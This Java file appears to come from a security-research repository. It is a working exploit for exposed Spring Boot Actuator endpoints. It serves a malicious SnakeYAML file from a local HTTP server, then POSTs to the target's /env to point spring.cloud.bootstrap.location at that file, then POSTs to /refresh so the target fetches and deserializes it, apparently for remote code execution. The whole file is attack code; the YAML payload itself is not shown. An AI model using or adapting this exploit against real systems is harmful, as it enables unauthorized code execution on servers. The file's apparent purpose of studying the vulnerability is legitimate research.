package com.threedr3am.bug.spring.actuator;

import com.threedr3am.bug.common.server.HTTPServer;
import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * copy snake-yaml-evil.yml to http server root（todo spring cloud Brixton version attack fail）
 *
 * @author threedr3am
 */
public class AttackSnakeYaml {

  static {
    HTTPServer.filePath = "/Users/xuanyonghao/security/java/my-project/learnjavabug/spring/spring-boot-actuator-bug/actuator-1.3/src/main/resources/snake-yaml-evil.yml";
    HTTPServer.contentType = "text/xml";
    HTTPServer.PORT = 23222;
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "spring.cloud.bootstrap.location=http://127.0.0.1:23222/snake-yaml-evil.yml";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/x-www-form-urlencoded", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
//          .setProxy(new HttpHost("127.0.0.1", 8080))
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/refresh");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
//          .setProxy(new HttpHost("127.0.0.1", 8080))
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
